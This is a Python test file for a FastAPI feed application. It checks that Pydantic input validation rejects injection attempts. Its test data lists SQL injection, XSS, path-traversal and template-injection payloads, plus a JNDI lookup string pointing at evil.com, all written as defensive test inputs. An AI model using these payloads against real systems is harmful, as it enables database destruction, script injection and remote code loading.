"""
Property 19: Input Validation Prevents Injection

**Validates: Requirements 18.2, 18.3**

For any API endpoint, Pydantic should validate and sanitize inputs to prevent
SQL injection and XSS attacks.
"""

import pytest
from hypothesis import given, settings, strategies as st, HealthCheck
from fastapi.testclient import TestClient
from pydantic import ValidationError
from uuid import uuid4

from app.main import app
from app.schemas.feed import SubscriptionToggleRequest
from app.schemas.article import ArticleResponse


@pytest.fixture
def client():
    """Create a test client for each test"""
    return TestClient(app)


@pytest.fixture(autouse=True)
def mock_settings():
    """Mock settings for JWT configuration"""
    from unittest.mock import patch
    with patch("app.api.auth.settings") as mock_settings:
        mock_settings.jwt_secret = "test_secret_at_least_32_characters_long_for_testing"
        mock_settings.jwt_algorithm = "HS256"
        mock_settings.jwt_expiration_days = 7
        mock_settings.cookie_secure = False
        yield mock_settings


# Property 19: Input Validation Prevents Injection
@settings(
    max_examples=100,
    suppress_health_check=[HealthCheck.function_scoped_fixture]
)
@given(
    # Generate potentially malicious strings
    malicious_input=st.sampled_from([
        "'; DROP TABLE users; --",
        "<script>alert('XSS')</script>",
        "' OR '1'='1",
        "../../../etc/passwd",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "' UNION SELECT * FROM users--",
        "<iframe src='javascript:alert(1)'></iframe>"
    ])
)
def test_input_validation_prevents_injection_property(client, malicious_input):
    """
    Property 19: Input Validation Prevents Injection
    
    **Validates: Requirements 18.2, 18.3**
    
    For any malicious input, Pydantic should either:
    1. Reject it with a validation error (422)
    2. Sanitize it and process safely
    
    This property ensures that:
    - SQL injection attempts are prevented (Requirement 18.2)
    - XSS attacks are prevented (Requirement 18.3)
    """
    # Test various endpoints with malicious input
    
    # Test 1: POST /api/subscriptions/toggle with malicious feed_id
    # This should fail validation because feed_id must be a valid UUID
    response = client.post(
        "/api/subscriptions/toggle",
        json={"feed_id": malicious_input},
        headers={"Authorization": "Bearer fake_token"}
    )
    
    # Should return either 401 (no auth) or 422 (validation error)
    # Never 500 (server error from injection)
    assert response.status_code in [401, 422], \
        f"Malicious input should be rejected, got status {response.status_code}"
    
    # Verify no SQL injection occurred (server didn't crash)
    assert response.status_code != 500, \
        "Server should not crash from malicious input"


def test_pydantic_uuid_validation():
    """
    Property 19: Input Validation (UUID Validation)
    
    **Validates: Requirements 18.2, 18.3**
    
    Verifies that Pydantic correctly validates UUID fields.
    """
    # Valid UUID should pass
    valid_uuid = str(uuid4())
    try:
        request = SubscriptionToggleRequest(feed_id=valid_uuid)
        assert str(request.feed_id) == valid_uuid
    except ValidationError:
        pytest.fail("Valid UUID should pass validation")
    
    # Invalid UUID should fail
    invalid_uuids = [
        "not-a-uuid",
        "'; DROP TABLE feeds; --",
        "<script>alert('XSS')</script>",
        "12345",
        ""
    ]
    
    for invalid_uuid in invalid_uuids:
        with pytest.raises(ValidationError):
            SubscriptionToggleRequest(feed_id=invalid_uuid)


def test_pydantic_string_validation():
    """
    Property 19: Input Validation (String Validation)
    
    **Validates: Requirements 18.2, 18.3**
    
    Verifies that Pydantic correctly validates string fields.
    """
    # Test with ArticleResponse which has string fields
    
    # Valid data should pass
    valid_data = {
        "id": str(uuid4()),
        "title": "Normal Article Title",
        "url": "https://example.com/article",
        "published_at": "2024-01-01T00:00:00",
        "tinkering_index": 3,
        "ai_summary": "This is a normal summary",
        "feed_name": "Tech News",
        "category": "Technology"
    }
    
    try:
        article = ArticleResponse(**valid_data)
        assert article.title == "Normal Article Title"
    except ValidationError:
        pytest.fail("Valid data should pass validation")
    
    # Malicious strings should be accepted but safely handled
    # (Pydantic doesn't sanitize, but it validates types)
    malicious_data = valid_data.copy()
    malicious_data["title"] = "<script>alert('XSS')</script>"
    
    try:
        article = ArticleResponse(**malicious_data)
        # The malicious string is stored as-is, but when rendered in a web app,
        # it should be escaped by the frontend framework
        assert article.title == "<script>alert('XSS')</script>"
    except ValidationError:
        # If validation fails, that's also acceptable
        pass


def test_pydantic_url_validation():
    """
    Property 19: Input Validation (URL Validation)
    
    **Validates: Requirements 18.2, 18.3**
    
    Verifies that Pydantic correctly validates URL fields.
    """
    # Valid URL should pass
    valid_data = {
        "id": str(uuid4()),
        "title": "Article",
        "url": "https://example.com/article",
        "tinkering_index": 3,
        "feed_name": "Feed",
        "category": "Tech"
    }
    
    try:
        article = ArticleResponse(**valid_data)
        assert str(article.url) == "https://example.com/article"
    except ValidationError:
        pytest.fail("Valid URL should pass validation")
    
    # Invalid URLs should fail
    invalid_urls = [
        "not-a-url",
        "javascript:alert('XSS')",
        "'; DROP TABLE articles; --",
        "<script>alert('XSS')</script>",
        "file:///etc/passwd"
    ]
    
    for invalid_url in invalid_urls:
        invalid_data = valid_data.copy()
        invalid_data["url"] = invalid_url
        
        with pytest.raises(ValidationError):
            ArticleResponse(**invalid_data)


def test_pydantic_integer_validation():
    """
    Property 19: Input Validation (Integer Validation)
    
    **Validates: Requirements 18.2, 18.3**
    
    Verifies that Pydantic correctly validates integer fields with constraints.
    """
    valid_data = {
        "id": str(uuid4()),
        "title": "Article",
        "url": "https://example.com/article",
        "tinkering_index": 3,
        "feed_name": "Feed",
        "category": "Tech"
    }
    
    # Valid tinkering_index (1-5) should pass
    for valid_index in [1, 2, 3, 4, 5]:
        data = valid_data.copy()
        data["tinkering_index"] = valid_index
        try:
            article = ArticleResponse(**data)
            assert article.tinkering_index == valid_index
        except ValidationError:
            pytest.fail(f"Valid tinkering_index {valid_index} should pass validation")
    
    # Invalid tinkering_index should fail
    invalid_indices = [0, 6, -1, 100, "'; DROP TABLE articles; --", "<script>"]
    
    for invalid_index in invalid_indices:
        data = valid_data.copy()
        data["tinkering_index"] = invalid_index
        
        with pytest.raises(ValidationError):
            ArticleResponse(**data)


@settings(
    max_examples=50,
    suppress_health_check=[HealthCheck.function_scoped_fixture]
)
@given(
    # Generate various types of invalid input
    invalid_input=st.one_of(
        st.none(),
        st.integers(min_value=-1000, max_value=-1),
        st.integers(min_value=1000, max_value=10000),
        st.text(min_size=0, max_size=10),
        st.lists(st.integers(), min_size=0, max_size=5)
    )
)
def test_pydantic_type_validation_property(invalid_input):
    """
    Property 19: Input Validation (Type Validation)
    
    **Validates: Requirements 18.2, 18.3**
    
    Property: For any invalid input type, Pydantic should raise ValidationError.
    """
    # Try to create SubscriptionToggleRequest with invalid feed_id
    with pytest.raises(ValidationError):
        SubscriptionToggleRequest(feed_id=invalid_input)


def test_sql_injection_prevention(client):
    """
    Property 19: Input Validation (SQL Injection Prevention)
    
    **Validates: Requirement 18.2**
    
    Verifies that SQL injection attempts are prevented.
    """
    sql_injection_attempts = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users--",
        "admin'--",
        "' OR 1=1--"
    ]
    
    for injection in sql_injection_attempts:
        # Try to inject via POST /api/subscriptions/toggle
        response = client.post(
            "/api/subscriptions/toggle",
            json={"feed_id": injection},
            headers={"Authorization": "Bearer fake_token"}
        )
        
        # Should return 401 (no auth) or 422 (validation error)
        # Never 500 (server error from injection)
        assert response.status_code in [401, 422], \
            f"SQL injection attempt should be rejected, got {response.status_code}"


def test_xss_prevention(client):
    """
    Property 19: Input Validation (XSS Prevention)
    
    **Validates: Requirement 18.3**
    
    Verifies that XSS attempts are prevented or safely handled.
    """
    xss_attempts = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<svg onload=alert('XSS')>"
    ]
    
    for xss in xss_attempts:
        # Try to inject via POST /api/subscriptions/toggle
        response = client.post(
            "/api/subscriptions/toggle",
            json={"feed_id": xss},
            headers={"Authorization": "Bearer fake_token"}
        )
        
        # Should return 401 (no auth) or 422 (validation error)
        # Never execute the XSS payload
        assert response.status_code in [401, 422], \
            f"XSS attempt should be rejected, got {response.status_code}"
        
        # Verify response doesn't contain unescaped XSS payload
        if response.status_code == 422:
            response_text = response.text
            # The response may contain the input for error reporting,
            # but it should be properly escaped in JSON
            assert "<script>" not in response_text or \
                   "&lt;script&gt;" in response_text or \
                   "\\u003c" in response_text, \
                "XSS payload should be escaped in error response"
